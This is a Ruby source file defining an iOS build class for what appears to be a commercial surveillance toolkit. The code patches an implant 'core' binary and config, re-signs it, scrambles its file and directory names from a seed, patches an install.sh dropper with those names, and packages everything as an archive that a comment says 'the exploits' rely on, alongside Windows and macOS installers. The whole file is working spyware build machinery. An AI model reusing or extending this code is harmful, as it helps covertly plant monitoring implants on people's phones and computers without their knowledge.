#
#  Agent creation for iOS
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildIOS < Build

  def initialize
    super
    @platform = 'ios'
  end
  
  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :ios, params['demo']

    # invoke the generic patch method with the new params
    super

    # realign the memory hashes after the binary patching
    CrossPlatform.exec path('ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('')}
  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7) + '.app'
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    dylib = scramble_name(config, 2)

    @scrambled = {core: core, dir: dir, config: config, dylib: dylib}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"
	
    # open the install.sh dropper and patch the value of the files to be installed
    file = File.open(path('install.sh'), 'rb+')
    content = file.read

    begin
      content['[:RCS_DIR:]'] = @scrambled[:dir]
    rescue
      raise "Install Dir marker not found"
    end

    begin
      content['[:RCS_CORE:]'] = @scrambled[:core]
    rescue
      raise "Core marker not found"
    end

    begin
      content['[:RCS_CONF:]'] = @scrambled[:config]
    rescue
      raise "Config marker not found"
    end

    begin
      content['[:RCS_DYLIB:]'] = @scrambled[:dylib]
    rescue
      raise "Dylib marker not found"
    end
    
    file.rewind
    file.write content
    file.close

    # this is useful to have all the files in one single archive, used by the exploits
    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |output|
        z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
      end
    end

    # create helper directories
    FileUtils.mkdir path('ios')
    FileUtils.mkdir path('win')
    FileUtils.mkdir path('osx')

    # files for the agent
    @outputs.each do |output|
      FileUtils.cp path(output), path("ios/#{File.basename(output)}")
    end

    # installer for windows
    Zip::ZipFile.open(path('win.zip')) do |z|
      z.each do |f|
        z.extract(f, path("win/#{f.name}"))
      end
    end

    # installer for osx
    Zip::ZipFile.open(path('osx.zip')) do |z|
      z.each do |f|
        z.extract(f, path("osx/#{f.name}"))
      end
    end

    # put it as the first file of the outputs, since the exploit relies on this
    @outputs.insert(0, 'output.zip')

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('installer.zip'), Zip::ZipFile::CREATE) do |z|
      Dir[path('ios/**')].each do |file|
        z.file.open("ios/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
      end
      Dir[path('win/**')].each do |file|
        z.file.open("win/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
      end
      #Dir[path('osx/**')].each do |file|
      #  z.file.open("osx/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
      #end
    end

    # we already have this file from the previous step
    @outputs = ['installer.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')
  end

end

end #DB::
end #RCS::
